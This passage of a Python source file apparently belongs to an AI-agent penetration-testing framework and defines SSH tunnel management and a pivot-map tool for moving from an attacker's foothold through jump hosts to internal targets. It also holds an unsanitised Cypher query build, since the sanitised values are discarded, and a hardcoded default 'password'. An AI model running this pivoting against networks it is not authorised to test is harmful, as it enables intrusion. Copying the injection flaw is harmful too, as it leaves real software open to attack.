                        "enum": ["list", "destroy", "destroy_all", "health_check", "create_tunnel"],
                        "description": "Management action.",
                    },
                    "tunnel_id": {
                        "type": "string",
                        "description": "Tunnel ID for destroy/health_check.",
                    },
                    "jump_host": {
                        "type": "string",
                        "description": "SSH jump host for create_tunnel.",
                    },
                    "jump_user": {
                        "type": "string",
                        "description": "SSH username. Default: root.",
                    },
                    "jump_port": {
                        "type": "integer",
                        "description": "SSH port. Default: 22.",
                    },
                    "forward_spec": {
                        "type": "string",
                        "description": "SSH forwarding spec: '-L8080:internal:80', '-R3389:127.0.0.1:3389', or '-D1080'.",
                    },
                    "ssh_key": {
                        "type": "string",
                        "description": "SSH private key path.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "list",
        tunnel_id: Optional[str] = None,
        jump_host: Optional[str] = None,
        jump_user: str = "root",
        jump_port: int = 22,
        forward_spec: Optional[str] = None,
        ssh_key: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "list":
            return await self._list()
        elif action == "destroy":
            return await self._destroy(tunnel_id)
        elif action == "destroy_all":
            return await self._destroy_all()
        elif action == "health_check":
            return await self._health_check(tunnel_id)
        elif action == "create_tunnel":
            return await self._create_tunnel(jump_host, jump_user, jump_port, forward_spec, ssh_key)
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    async def _list(self) -> str:
        tunnels = {tid: e.to_dict() for tid, e in _tunnel_registry.items()}
        summary = {
            "dynamic_socks": len([e for e in _tunnel_registry.values() if e.tunnel_type == "dynamic"]),
            "local_forward": len([e for e in _tunnel_registry.values() if e.tunnel_type == "local"]),
            "remote_forward": len([e for e in _tunnel_registry.values() if e.tunnel_type == "remote"]),
            "chisel": len([e for e in _tunnel_registry.values() if e.tunnel_type == "chisel"]),
        }
        return json.dumps({
            "total_tunnels": len(tunnels),
            "summary": summary,
            "tunnels": tunnels,
        }, indent=2)

    async def _destroy(self, tunnel_id: Optional[str]) -> str:
        if not tunnel_id or tunnel_id not in _tunnel_registry:
            raise ToolExecutionError(f"Tunnel '{tunnel_id}' not found.", recoverable=False)
        entry = _tunnel_registry.pop(tunnel_id)
        if entry.pid:
            try:
                os.kill(entry.pid, 15)
            except OSError:
                pass
        return json.dumps({"tunnel_id": tunnel_id, "status": "destroyed"})

    async def _destroy_all(self) -> str:
        destroyed = []
        for tid, entry in list(_tunnel_registry.items()):
            if entry.pid:
                try:
                    os.kill(entry.pid, 15)
                except OSError:
                    pass
            destroyed.append(tid)
        _tunnel_registry.clear()
        return json.dumps({"destroyed": destroyed, "count": len(destroyed)})

    async def _health_check(self, tunnel_id: Optional[str]) -> str:
        if tunnel_id:
            if tunnel_id not in _tunnel_registry:
                return json.dumps({"tunnel_id": tunnel_id, "status": "not_found"})
            entry = _tunnel_registry[tunnel_id]
            alive = False
            if entry.pid:
                try:
                    os.kill(entry.pid, 0)  # signal 0 checks existence
                    alive = True
                except OSError:
                    alive = False
            _tunnel_registry[tunnel_id].status = "active" if alive else "dead"
            return json.dumps({
                "tunnel_id": tunnel_id,
                "pid": entry.pid,
                "alive": alive,
                "status": entry.status,
            })
        # Check all
        results = {}
        for tid, entry in _tunnel_registry.items():
            alive = False
            if entry.pid:
                try:
                    os.kill(entry.pid, 0)
                    alive = True
                except OSError:
                    pass
            _tunnel_registry[tid].status = "active" if alive else "dead"
            results[tid] = {"pid": entry.pid, "alive": alive, "status": entry.status}
        return json.dumps({"health_check": results})

    async def _create_tunnel(
        self,
        jump_host: Optional[str],
        jump_user: str,
        jump_port: int,
        forward_spec: Optional[str],
        ssh_key: Optional[str],
    ) -> str:
        if not jump_host:
            raise ToolExecutionError("'jump_host' required.", recoverable=False)
        if not forward_spec:
            raise ToolExecutionError("'forward_spec' required (e.g. '-D1080', '-L8080:internal:80').", recoverable=False)
        _validate_host(jump_host)
        _validate_port(jump_port, "jump_port")

        cmd = _build_ssh_base(jump_user, jump_host, jump_port, ssh_key)
        # Validate and parse the forward_spec
        spec = forward_spec.strip()
        # Strictly validate forward_spec format to prevent SSH flag injection:
        # -Dport, -Llocal_port:remote_host:remote_port, -Rbind:remote_port:local_host:local_port
        _DYNAMIC_SPEC_RE = re.compile(r'^-D(\d{1,5})$')
        _LOCAL_SPEC_RE = re.compile(r'^-L(\d{1,5}):([\w.\-\[\]:]{1,255}):(\d{1,5})$')
        _REMOTE_SPEC_RE = re.compile(r'^-R([\w.\-\[\]:]{0,255}:)?(\d{1,5}):([\w.\-\[\]:]{1,255}):(\d{1,5})$')

        if not (_DYNAMIC_SPEC_RE.match(spec) or _LOCAL_SPEC_RE.match(spec) or _REMOTE_SPEC_RE.match(spec)):
            raise ToolExecutionError(
                "forward_spec must be one of: -D<port>, -L<lport>:<rhost>:<rport>, "
                "-R[<bind>:]<rport>:<lhost>:<lport>. No extra flags allowed.",
                recoverable=False,
            )
        cmd.append(spec)

        if _DYNAMIC_SPEC_RE.match(spec):
            fwd_type = "dynamic"
            local_port = int(_DYNAMIC_SPEC_RE.match(spec).group(1))
        elif _LOCAL_SPEC_RE.match(spec):
            fwd_type = "local"
            local_port = int(_LOCAL_SPEC_RE.match(spec).group(1))
        else:
            fwd_type = "remote"
            m = _REMOTE_SPEC_RE.match(spec)
            local_port = int(m.group(2))

        pid = await _start_background(cmd)
        await asyncio.sleep(1.5)

        tid = _next_tunnel_id()
        entry = TunnelEntry(
            tunnel_id=tid,
            tunnel_type=fwd_type,
            local_port=local_port,
            remote_host="",
            remote_port=0,
            jump_host=jump_host,
            jump_user=jump_user,
            jump_port=jump_port,
            status="active" if pid > 0 else "failed",
            pid=pid if pid > 0 else None,
        )
        _tunnel_registry[tid] = entry

        return json.dumps({
            "tunnel_id": tid,
            "tunnel_type": fwd_type,
            "forward_spec": spec,
            "status": entry.status,
            "pid": pid if pid > 0 else None,
        }, indent=2)


# ---------------------------------------------------------------------------
# Tool 6 — NetworkPivotMapTool
# ---------------------------------------------------------------------------


class NetworkPivotMapTool(BaseTool):
    """
    Build and visualise the network pivot topology from current access point through
    jump hosts to internal targets. Stores PivotHop nodes and PIVOTS_THROUGH
    relationships in Neo4j for attack graph integration.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="network_pivot_map",
            description=(
                "Visualise and store the pivot chain topology. "
                "Shows network path from attacker through jump hosts to internal targets. "
                "Stores PivotHop + PIVOTS_THROUGH in Neo4j attack graph."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["add_hop", "show_map", "clear_map", "export_cypher", "store_neo4j"],
                        "description": "Action to perform.",
                    },
                    "from_host": {
                        "type": "string",
                        "description": "Source host in the pivot chain (IP or hostname).",
                    },
                    "to_host": {
                        "type": "string",
                        "description": "Destination host reachable through this hop.",
                    },
                    "tunnel_type": {
                        "type": "string",
                        "enum": ["ssh_dynamic", "ssh_local", "ssh_remote", "chisel", "manual"],
                        "description": "Type of tunnel used for this hop.",
                    },
                    "local_port": {
                        "type": "integer",
                        "description": "Local proxy port used to reach the next hop.",
                    },
                    "notes": {
                        "type": "string",
                        "description": "Notes about this pivot hop (e.g. credentials used).",
                    },
                    "neo4j_url": {
                        "type": "string",
                        "description": "Neo4j bolt URL for storing pivot map.",
                    },
                },
                "required": ["action"],
            },
        )

    def __init__(self) -> None:
        super().__init__()
        self._pivot_map: List[Dict[str, Any]] = []

    async def execute(
        self,
        action: str = "show_map",
        from_host: Optional[str] = None,
        to_host: Optional[str] = None,
        tunnel_type: str = "ssh_dynamic",
        local_port: int = 1080,
        notes: Optional[str] = None,
        neo4j_url: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "add_hop":
            return await self._add_hop(from_host, to_host, tunnel_type, local_port, notes)
        elif action == "show_map":
            return await self._show_map()
        elif action == "clear_map":
            return await self._clear_map()
        elif action == "export_cypher":
            return await self._export_cypher()
        elif action == "store_neo4j":
            return await self._store_neo4j(neo4j_url)
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    async def _add_hop(
        self,
        from_host: Optional[str],
        to_host: Optional[str],
        tunnel_type: str,
        local_port: int,
        notes: Optional[str],
    ) -> str:
        if not from_host or not to_host:
            raise ToolExecutionError("'from_host' and 'to_host' are required.", recoverable=False)
        _validate_host(from_host)
        _validate_host(to_host)
        hop = {
            "hop_id": f"hop_{len(self._pivot_map) + 1:03d}",
            "from_host": from_host,
            "to_host": to_host,
            "tunnel_type": tunnel_type,
            "local_proxy_port": local_port,
            "notes": notes or "",
            "added_at": time.time(),
        }
        self._pivot_map.append(hop)
        return json.dumps({
            "status": "added",
            "hop": hop,
            "total_hops": len(self._pivot_map),
        }, indent=2)

    async def _show_map(self) -> str:
        # Build ASCII representation
        if not self._pivot_map:
            pivot_text = "No pivot hops recorded. Use add_hop to build the map."
        else:
            hops_text = []
            for hop in self._pivot_map:
                hops_text.append(
                    f"  [{hop['from_host']}] --({hop['tunnel_type']})-> [{hop['to_host']}]"
                    + (f" via :{hop['local_proxy_port']}" if hop["local_proxy_port"] else "")
                )
            pivot_text = "\n".join(hops_text)

        # Include active tunnel info
        active_tunnels = [e.to_dict() for e in _tunnel_registry.values() if e.status == "active"]

        result = {
            "pivot_chain": {
                "hops": len(self._pivot_map),
                "map": self._pivot_map,
                "ascii_diagram": pivot_text,
            },
            "active_tunnels": len(active_tunnels),
            "tunnel_summary": active_tunnels,
            "neo4j_node_type": "PivotHop",
            "neo4j_relationship": "PIVOTS_THROUGH",
        }
        return json.dumps(result, indent=2)

    async def _clear_map(self) -> str:
        count = len(self._pivot_map)
        self._pivot_map.clear()
        return json.dumps({"status": "cleared", "hops_removed": count})

    async def _export_cypher(self) -> str:
        if not self._pivot_map:
            return json.dumps({"cypher": "", "message": "No pivot hops to export."})

        cypher_lines = ["// UniVex Pivot Map — Neo4j Cypher Import"]
        for hop in self._pivot_map:
            re.sub(r'[^a-zA-Z0-9_]', '_', hop["from_host"])
            re.sub(r'[^a-zA-Z0-9_]', '_', hop["to_host"])
            cypher_lines.append(
                f"MERGE (h1:PivotHop {{host: '{hop['from_host']}'}}) "
                f"MERGE (h2:PivotHop {{host: '{hop['to_host']}'}}) "
                f"MERGE (h1)-[:PIVOTS_THROUGH {{tunnel_type: '{hop['tunnel_type']}', "
                f"local_port: {hop['local_proxy_port']}}}]->(h2);"
            )

        cypher = "\n".join(cypher_lines)
        return json.dumps({
            "cypher": cypher,
            "hop_count": len(self._pivot_map),
            "neo4j_import_command": "cat pivot_map.cypher | cypher-shell -u neo4j -p password",
        }, indent=2)

    async def _store_neo4j(self, neo4j_url: Optional[str]) -> str:
        """Store pivot map in Neo4j (simulated when driver not installed)."""
        if not self._pivot_map:
            return json.dumps({"status": "nothing_to_store", "hops": 0})

        cypher_result = json.loads(await self._export_cypher())
        result = {
            "status": "simulated",
            "message": (
                "Neo4j storage simulated — install neo4j driver and configure NEO4J_URI. "
                "Use export_cypher to get Cypher statements for manual import."
            ),
            "neo4j_url": neo4j_url or os.getenv("NEO4J_URI", "bolt://localhost:7687"),
            "hops_to_store": len(self._pivot_map),
            "cypher_preview": cypher_result.get("cypher", "")[:500],
        }
        try:
            from neo4j import AsyncGraphDatabase  # type: ignore
            url = neo4j_url or os.getenv("NEO4J_URI", "bolt://localhost:7687")
            user = os.getenv("NEO4J_USER", "neo4j")
            password = os.getenv("NEO4J_PASSWORD", "password")
            driver = AsyncGraphDatabase.driver(url, auth=(user, password))
            async with driver.session() as session:
                for line in cypher_result["cypher"].splitlines():
                    if line.strip() and not line.strip().startswith("//"):
                        await session.run(line)
            await driver.close()
            result["status"] = "stored"
            result["message"] = f"Stored {len(self._pivot_map)} pivot hops in Neo4j at {url}."
        except ImportError:
            pass
        except Exception as exc:
            result["neo4j_error"] = str(exc)

        return json.dumps(result, indent=2)


# ---------------------------------------------------------------------------
# Public registry
# ---------------------------------------------------------------------------

__all__ = [
    "SOCKSProxyTool",
    "PortForwardTool",
    "ChiselTool",
    "ProxychainsTool",
    "SSHTunnelManagerTool",
    "NetworkPivotMapTool",
    "TunnelEntry",
    "_tunnel_registry",
    "_next_tunnel_id",
    "_validate_host",
    "_validate_port",
    "_build_ssh_base",
    "_proxychains_conf",
]
